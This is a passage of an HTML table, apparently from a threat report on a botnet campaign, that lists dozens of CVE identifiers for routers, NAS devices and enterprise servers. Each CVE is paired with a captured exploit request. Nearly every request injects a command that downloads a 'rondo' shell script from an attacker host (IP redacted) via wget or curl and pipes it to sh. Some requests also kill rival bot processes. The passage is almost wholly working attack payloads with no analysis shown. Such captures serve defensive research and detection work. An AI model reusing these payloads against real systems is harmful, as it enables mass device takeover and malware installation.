user=rootxx&amp;pam=&amp;expired=2&amp;old=test|wget -qO- http://&lt;REDACTED_IP&gt;/rondo.eby.sh|sh&amp;new1=test2&amp;new2=test2</code></pre></td></tr>
<tr><td>CVE-2019-17621</td><td><pre><code>SUBSCRIBE /gena.cgi?service=\`busybox wget -O- http://&lt;REDACTED_IP&gt;/rondo.dlinkupnp.sh|sh;\` HTTP/1.0
Host: &lt;REDACTED_IP&gt;:49152
Callback: &lt;http://&lt;REDACTED_IP&gt;:34033/ServiceProxy27&gt;
NT: upnp:event
Timeout: Second-1800
Accept-Encoding: gzip, deflate
User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50

</code></pre></td></tr>
<tr><td>CVE-2019-19492</td><td><pre><code>api system (wget -qO- http://&lt;REDACTED_IP&gt;/rondo.wns.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.wns.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.wns.sh)|sh&amp;\x0a\x0a</code></pre></td></tr>
<tr><td>CVE-2019-25024</td><td><pre><code>POST /functions/ajax_system.php HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

post_service=;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.aqu.sh|sh</code></pre></td></tr>
<tr><td>CVE-2019-9082</td><td><pre><code>GET /index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.txg.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.txg.sh)|sh HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2020-10987</td><td><pre><code>GET /goform/setUsbUnload/.js?deviceName=A;wget -O- http://&lt;REDACTED_IP&gt;/rondo.uzz.sh|sh; HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2020-11963</td><td><pre><code>GET /cgi-bin/luci/er/reboot_link?link=&#x27;\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.hqf.sh|sh\`&#x27; HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)

</code></pre></td></tr>
<tr><td>CVE-2020-13117</td><td><pre><code>POST /cgi-bin/login.cgi HTTP/1.0
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded; charset=utf-8

page=login&amp;newUI=0&amp;username=admin&amp;password=password&amp;hostname=localhost&amp;ipaddr=&lt;REDACTED_IP&gt;&amp;homepage=index&amp;sysinitpage=index&amp;wizardpage=index&amp;login_page=index&amp;lang_select=0&amp;langChange=0&amp;key=&#x27; \`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.rtg.sh|sh\` #</code></pre></td></tr>
<tr><td>CVE-2020-14080</td><td><pre><code>POST /apply_sec.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded
Referer: http://&lt;REDACTED_IP&gt;:8080/login_pic.asp

html_response_page=login_pic.asp&amp;action=ping_test&amp;ping_ipaddr=&lt;REDACTED_IP&gt;\x0abusybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.zta.sh|sh&amp;</code></pre></td></tr>
<tr><td>CVE-2020-16846</td><td><pre><code>POST /run HTTP/1.1
Host: &lt;REDACTED_IP&gt;:9999
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)
Content-Type: application/json

{&quot;jobId&quot;:1,&quot;executorHandler&quot;:&quot;demoJobHandler&quot;,&quot;executorParams&quot;:&quot;demoJobHandler&quot;,&quot;executorBlockStrategy&quot;:&quot;COVER_EARLY&quot;,&quot;executorTimeout&quot;:3600,&quot;logId&quot;:1,&quot;logDateTime&quot;:1586629003729,&quot;glueType&quot;:&quot;GLUE_SHELL&quot;,&quot;glueSource&quot;:&quot;(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.aqg.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.aqg.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.aqg.sh)|sh&quot;,&quot;glueUpdatetime&quot;:1586629003727,&quot;broadcastIndex&quot;:0,&quot;broadcastTotal&quot;:0}</code></pre></td></tr>
<tr><td>CVE-2020-17456</td><td><pre><code>POST /cgi-bin/system_log.cgi? HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded
Referer: http://&lt;REDACTED_IP&gt;/

Command=Diagnostic&amp;traceMode=ping&amp;reportIpOnly=&amp;pingIpAddr=;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.nfu.sh|sh&amp;pingPktSize=56&amp;pingTimeout=30&amp;pingCount=4&amp;maxTTLCnt=30&amp;queriesCnt=3&amp;reportIpOnlyCheckbox=on&amp;logarea=com.cgi&amp;btnApply=Apply&amp;T=1755623821293</code></pre></td></tr>
<tr><td>CVE-2020-18568</td><td><pre><code>POST /upnp/control/WANIPConn1 HTTP/1.1
Host: &lt;REDACTED_IP&gt;:49152
User-Agent: UPnP/1.0 (bang2012@protonmail.com)
Content-Type: text/xml; charset=&quot;utf-8&quot;

&lt;?xml version=&quot;1.0&quot;?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;s:Body&gt;&lt;u:AddPortMapping xmlns:u=&quot;urn:schemas-upnp-org:service:WANIPConnection:1&quot;&gt;&lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;&lt;NewExternalPort&gt;12345&lt;/NewExternalPort&gt;&lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;&lt;NewInternalPort&gt;12345&lt;/NewInternalPort&gt;&lt;NewInternalClient&gt;&lt;REDACTED_IP&gt;&lt;/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;/NewEnabled&gt;&lt;NewPortMappingDescription&gt;\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.hsg.sh|sh\`&lt;/NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;0&lt;/NewLeaseDuration&gt;&lt;/u:AddPortMapping&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</code></pre></td></tr>
<tr><td>CVE-2020-24949</td><td><pre><code>GET /infusions/downloads/downloads.php?cat_id=${system(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.wcr.sh|sh)} HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2020-25494</td><td><pre><code>POST /cgi-bin/printbook HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8457
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded
Referer: http://&lt;REDACTED_IP&gt;:8457/en/Navpages/printmap.html

outputform=ps|wget -qO- http://&lt;REDACTED_IP&gt;/rondo.wns.sh|sh&amp;&amp;booktitle=test&amp;toclevels=3&amp;part=/en/OSR_FEATS/CONTENTS.html&amp;part=/en/USE_oview/CONTENTS.</code></pre></td></tr>
<tr><td>CVE-2020-25506</td><td><pre><code>POST /cgi-bin/system_mgr.cgi? HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded

</code></pre></td></tr>
<tr><td>CVE-2020-28188</td><td><pre><code>GET /tos/index.php?explorer/pathList&amp;path=\`(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.whm.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.whm.sh)|sh\` HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2020-35713</td><td><pre><code>POST /goform/setSysAdm HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)
Content-Type: application/x-www-form-urlencoded
Referer: http://&lt;REDACTED_IP&gt;/login.shtml

admuser=admin&amp;admpass=;busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.rwx.sh|sh;&amp;admpasshint=61646D696E=&amp;AuthTimeout=600&amp;wirelessMgmt_http=1</code></pre></td></tr>
<tr><td>CVE-2020-7209</td><td><pre><code>GET /linuxki/experimental/vis/kivis.php?type=kitrace&amp;pid=15;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.pms.sh|sh; HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2020-8515</td><td><pre><code>POST /cgi-bin/mainfunction.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded

action=login&amp;keyPath=&#x27;\x0abusybox${IFS}wget${IFS}-qO-${IFS}http://&lt;REDACTED_IP&gt;/rondo.tja.sh|sh\x0a&#x27;&amp;loginUser=a&amp;loginPwd=a</code></pre></td></tr>
<tr><td>CVE-2020-8813</td><td><pre><code>GET /graph_realtime.php?action=init HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Cookie: Cacti=;wget${IFS}-qO-${IFS}http://&lt;REDACTED_IP&gt;/rondo.aqu.sh|sh

</code></pre></td></tr>
<tr><td>CVE-2020-9054</td><td><pre><code>GET /adv,/cgi-bin/weblogin.cgi?username=admin&#x27;;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.bxd.sh|sh&amp;echo &amp;password=asdf HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2020-9374</td><td><pre><code>POST /cgi?2 HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: text/plain
Cookie: Authorization=Basic YWRtaW46YWRtaW4=
Referer: http://&lt;REDACTED_IP&gt;:8080/mainFrame.htm

[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8
maxHopCount=20
timeout=50
numberOfTries=1
host=&quot;\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.zqq.sh|sh\`&quot;
dataBlockSize=64
X_TP_ConnName=ewan_ipoe_d
diagnosticsState=Requested
X_TP_HopSeq=0
</code></pre></td></tr>
<tr><td>CVE-2021-1498</td><td><pre><code>POST /storfs-asup HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

action=&amp;token=\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.rtg.sh|sh\`</code></pre></td></tr>
<tr><td>CVE-2021-22205</td><td><pre><code>POST /c29e1a94e8ff58fc HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: multipart/form-data; boundary=------------------------7d40cae17573a039

--------------------------7d40cae17573a039
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;rondo.jpg&quot;
Content-Type: image/jpeg

AT&amp;TFORM</code></pre></td></tr>
<tr><td>CVE-2021-22502</td><td><pre><code>POST /AdminService/urest/v1/LogonResource HTTP/1.1
Host: &lt;REDACTED_IP&gt;:21411
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)
Content-Type: application/json

{&quot;userName&quot;: &quot;a\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.eqx.sh|sh\`&quot;,&quot;credential&quot;: &quot;a&quot;}</code></pre></td></tr>
<tr><td>CVE-2021-25646</td><td><pre><code>POST /druid/indexer/v1/sampler HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8888
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/json

{&quot;type&quot;:&quot;index&quot;,&quot;spec&quot;:{&quot;ioConfig&quot;:{&quot;type&quot;:&quot;index&quot;,&quot;firehose&quot;:{&quot;type&quot;:&quot;local&quot;,&quot;baseDir&quot;:&quot;/etc&quot;,&quot;filter&quot;:&quot;passwd&quot;}},&quot;dataSchema&quot;:{&quot;dataSource&quot;:&quot;QxRkLmZp&quot;,&quot;parser&quot;:{&quot;parseSpec&quot;:{&quot;format&quot;:&quot;javascript&quot;,&quot;timestampSpec&quot;:{},&quot;dimensionsSpec&quot;:{},&quot;function&quot;:&quot;function(){var AbCdEf=new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\&quot;/bin/sh\`@~-c\`@~(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.mtg.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.mtg.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.mtg.sh)|sh\&quot;.split(\&quot;\`@~\&quot;)).getInputStream()).useDelimiter(\&quot;\\A\&quot;).next();return {timestamp:\&quot;1234567\&quot;,GhIjKl:AbCdEf}}&quot;,&quot;&quot;:{&quot;enabled&quot;:&quot;true&quot;}}}},&quot;samplerConfig&quot;:{&quot;numRows&quot;:10}}</code></pre></td></tr>
<tr><td>CVE-2021-27561</td><td><pre><code>GET /premise/front/getPingData?url=http://&lt;REDACTED_IP&gt;:9600/sm/api/v1/firewall/zone/services?zone=;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.rtg.sh|sh; HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2021-28151</td><td><pre><code>POST /tools.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWRtaW46YWRtaW4=

op_type=ping&amp;destination=;busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.rwx.sh|sh;&amp;user_options=</code></pre></td></tr>
<tr><td>CVE-2021-29003</td><td><pre><code>GET /sys_config_valid.xgi?exeshell=\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.enk.sh|sh\` HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2021-35394</td><td><pre><code>orf;killall -9 mipsel mpsl mips boatnet.mpsl;busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.kqa.sh|sh;echo </code></pre></td></tr>
<tr><td>CVE-2021-4039</td><td><pre><code>POST /login/login.html HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8081
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Referer: http://&lt;REDACTED_IP&gt;:8081/login/login.htmlContent-Type: application/x-www-form-urlencoded

myname=ffUfRAgO\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.enk.sh|sh\`&amp;mypasswd=test&amp;Submit=Login</code></pre></td></tr>
<tr><td>CVE-2021-41773</td><td><pre><code>POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: text/plain

(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.dgx.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.dgx.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.dgx.sh)|sh&amp;</code></pre></td></tr>
<tr><td>CVE-2022-1388</td><td><pre><code>POST /mgmt/tm/util/bash HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/json
Authorization: Basic YWRtaW46

{&quot;command&quot;:&quot;run&quot;,&quot;utilCmdArgs&quot;:&quot;-c &#x27;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.eby.sh|sh&#x27;&quot;}</code></pre></td></tr>
<tr><td>CVE-2022-22947</td><td><pre><code>POST /actuator/gateway/routes/rxvpkejx HTTP/1.1
Host: &lt;REDACTED_IP&gt;:9000
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/json

{&quot;id&quot;: &quot;rxvpkejx&quot;, &quot;filters&quot;: [{&quot;name&quot;: &quot;AddResponseHeader&quot;, &quot;args&quot;: {&quot;name&quot;: &quot;Result&quot;, &quot;value&quot;: &quot;#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\&quot;(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.pju.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.pju.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.pju.sh)|sh\&quot;).getInputStream()))}&quot;}}], &quot;uri&quot;: &quot;http://example.com&quot;}</code></pre></td></tr>
<tr><td>CVE-2022-22963</td><td><pre><code>POST /functionRouter HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

data=</code></pre></td></tr>
<tr><td>CVE-2022-24112</td><td><pre><code>POST /apisix/batch-requests HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)
Content-Type: application/json

{&quot;headers&quot;: {&quot;X-Real-IP&quot;: &quot;&lt;REDACTED_IP&gt;&quot;, &quot;X-API-KEY&quot;: &quot;edd1c9f034335f136f87ad84b625c8f1&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;}, &quot;timeout&quot;: 1500, &quot;pipeline&quot;: [{&quot;path&quot;: &quot;/apisix/admin/routes/index&quot;, &quot;method&quot;: &quot;PUT&quot;, &quot;body&quot;: &quot;{\&quot;uri\&quot;:\&quot;/rms/fzxewh\&quot;,\&quot;upstream\&quot;:{\&quot;type\&quot;:\&quot;roundrobin\&quot;,\&quot;nodes\&quot;:{\&quot;schmidt-schaefer.com\&quot;:1}},\&quot;name\&quot;:\&quot;wthtzv\&quot;,\&quot;filter_func\&quot;:\&quot;function(vars) os.execute(&#x27;(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.dgx.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.dgx.sh)|sh&#x27;); return true end\&quot;}&quot;}]}</code></pre></td></tr>
<tr><td>CVE-2022-26134</td><td><pre><code>GET /${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.whm.sh|sh&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}/ HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8090
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2022-30425</td><td><pre><code>POST /goform/mp HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWRtaW46MTIzNA==

command=||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.dcd.sh|sh&amp;echo </code></pre></td></tr>
<tr><td>CVE-2022-30525</td><td><pre><code>POST /ztp/cgi-bin/handler HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/json

{&quot;command&quot;: &quot;setWanPortSt&quot;, &quot;proto&quot;: &quot;dhcp&quot;, &quot;port&quot;: &quot;4&quot;, &quot;vlan_tagged&quot;: &quot;1&quot;, &quot;vlanid&quot;: &quot;5&quot;, &quot;mtu&quot;: &quot;;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.kdw.sh|sh;echo &quot;, &quot;data&quot;: &quot;&quot;}</code></pre></td></tr>
<tr><td>CVE-2022-33891</td><td><pre><code>GET /?doAs=\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.pms.sh|sh\` HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2022-34538</td><td><pre><code>GET /cgi-bin/admin/vca/bia/addacph.cgi?mod&amp;event=a&amp;id=1&amp;pluginname=;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.enk.sh|sh;&amp;name=a&amp;evt_id=a HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2022-36267</td><td><pre><code>POST /cgi-bin/diagnostics.cgi HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

Command=pingDiagnostic&amp;targetIP=&lt;REDACTED_IP&gt;\`wget -qO- http://&lt;REDACTED_IP&gt;/rondo.enk.sh|sh\`&amp;packetSize=55&amp;timeOut=10&amp;count=1</code></pre></td></tr>
<tr><td>CVE-2022-37061</td><td><pre><code>POST /res.php HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

action=alarm&amp;id=2;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.bfx.sh|sh</code></pre></td></tr>
<tr><td>CVE-2022-43769</td><td><pre><code>GET /pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=#{T(java.lang.Runtime).getRuntime().exec(&#x27;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.pms.sh|sh&#x27;)}&amp;mgrDn=a&amp;pwd=a HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)

</code></pre></td></tr>
<tr><td>CVE-2023-1389</td><td><pre><code>GET /cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=$(killall+-9+mipsel+mpsl;(wget+-O-+http://&lt;REDACTED_IP&gt;/rondo.sh||busybox+wget+-O-+http://&lt;REDACTED_IP&gt;/rondo.sh)+|+sh+-s+tplink;) HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36

</code></pre></td></tr>
<tr><td>CVE-2023-20887</td><td><pre><code>POST /saas./resttosaasservlet HTTP/1.1
Host: &lt;REDACTED_IP&gt;:9090
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-thrift

[1,&quot;createSupportBundle&quot;,1,0,{&quot;1&quot;:{&quot;str&quot;:&quot;1111&quot;},&quot;2&quot;:{&quot;str&quot;:&quot;\`(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.dtm.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.dtm.sh)|sh\`&quot;},&quot;3&quot;:{&quot;str&quot;:&quot;value3&quot;},&quot;4&quot;:{&quot;lst&quot;:[&quot;str&quot;,2,&quot;AAAA&quot;,&quot;BBBB&quot;]}}]</code></pre></td></tr>
<tr><td>CVE-2023-22527</td><td><pre><code>POST /template/aui/text-inline.vm HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8090
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Content-Type: application/x-www-form-urlencoded

label=\u0027+#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})+\u0027&amp;x=@org.apache.struts2.ServletActionContext@getResponse().setHeader(&#x27;X-Cmd-Response&#x27;,(new freemarker.template.utility.Execute()).exec({&quot;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.whm.sh|sh&quot;}))</code></pre></td></tr>
<tr><td>CVE-2023-24796</td><td><pre><code>POST /goform/sysTools HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded
Authorization: Basic YWRtaW46YWRtaW4=

tool=0&amp;pingCount=4&amp;host=&amp;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.ucz.sh|sh&amp;sumbit=OK</code></pre></td></tr>
<tr><td>CVE-2023-25280</td><td><pre><code>POST /ping.ccp HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (bang2012@protonmail.com)
Content-Type: application/x-www-form-urlencoded

ccp_act=ping_v6&amp;ping_addr=$(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.ywy.sh|sh)</code></pre></td></tr>
<tr><td>CVE-2023-26801</td><td><pre><code>POST /goform/set_LimitClient_cfg HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Cookie: user=admin

time1=00:00-00:00&amp;time2=00:00-00:00&amp;mac=;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.xqe.sh|sh;echo </code></pre></td></tr>
<tr><td>CVE-2023-26802</td><td><pre><code>GET /cgi-bin/network_config/nsg_masq.cgi?user_name=admin&amp;session_id=../&amp;lang=zh_CN.UTF-8&amp;act=2&amp;proto=;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.eby.sh|sh; HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)

</code></pre></td></tr>
<tr><td>CVE-2023-27076</td><td><pre><code>GET /cgi-bin/luci?language=$(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.uzz.sh|sh) HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@atomicmail.io)
Cookie: repeatTimes=0
Referer: http://&lt;REDACTED_IP&gt;/cgi-bin/luci

</code></pre></td></tr>
<tr><td>CVE-2023-28771</td><td><pre><code>CPCSRTVV\x00\x00\x00\x00\x00\x00\x00\x00) &quot;\x08\x00\x00\x00\x00\x00\x00\x00\xfffd\x00\x00\x00\xfffd\x01\x00\x00\x0eHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXBHAXB&quot;;bash -c &quot;curl http://&lt;REDACTED_IP&gt;/rondo.sh -o- | sh -s zyxel&quot;;echo -n &quot;</code></pre></td></tr>
<tr><td>CVE-2023-3306</td><td><pre><code>POST /bf/tracert HTTP/1.1
Host: &lt;REDACTED_IP&gt;:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/&lt;REDACTED_IP&gt; Safari/537.36
Content-Type: application/json
Cookie: bcrsession=

{\x0a\x09\x09&quot;tracert_address&quot;: &quot;||wget -qO- http://&lt;REDACTED_IP&gt;/rondo.pjh.sh|sh;&quot;,\x0a\x09\x09&quot;is_first_req&quot;: true\x0a\x09}</code></pre></td></tr>
<tr><td>CVE-2023-33617</td><td><pre><code>POST /boaform/admin/formPing6 HTTP/1.1
Host: &lt;REDACTED_IP&gt;
User-Agent: Mozilla/5.0 (bang2012@tutanota.de)
Content-Type: application/x-www-form-urlencoded

pingAddr=2;wget -qO- http://&lt;REDACTED_IP&gt;/rondo.rwx.sh|sh;&amp;wanif=65535&amp;go=+Go&amp;submit-url=/admin/ping6.asp</code></pre></td></tr>
<tr><td>CVE-2023-33831</td><td><pre><code>POST /api/runscript HTTP/1.1
Host: &lt;REDACTED_IP&gt;:1881
User-Agent: Mozilla/5.0 (bang2013@atomicmail.io)
Content-Type: application/json

{&quot;headers&quot;: {&quot;normalizedNames&quot;: {}, &quot;lazyUpdate&quot;: null}, &quot;params&quot;: {&quot;script&quot;: {&quot;parameters&quot;: [{&quot;name&quot;: &quot;ok&quot;, &quot;type&quot;: &quot;tagid&quot;, &quot;value&quot;: &quot;&quot;}], &quot;mode&quot;: &quot;&quot;, &quot;id&quot;: &quot;&quot;, &quot;test&quot;: &quot;true&quot;, &quot;name&quot;: &quot;ok&quot;, &quot;outputId&quot;: &quot;&quot;, &quot;code&quot;: &quot;require(&#x27;child_process&#x27;).exec(&#x27;(wget -qO- http://&lt;REDACTED_IP&gt;/rondo.qvy.sh||busybox wget -qO- http://&lt;REDACTED_IP&gt;/rondo.qvy.sh||curl -s http://&lt;REDACTED_IP&gt;/rondo.qvy.sh)|sh&#x27;)&quot;}}}</code></pre></td></tr>
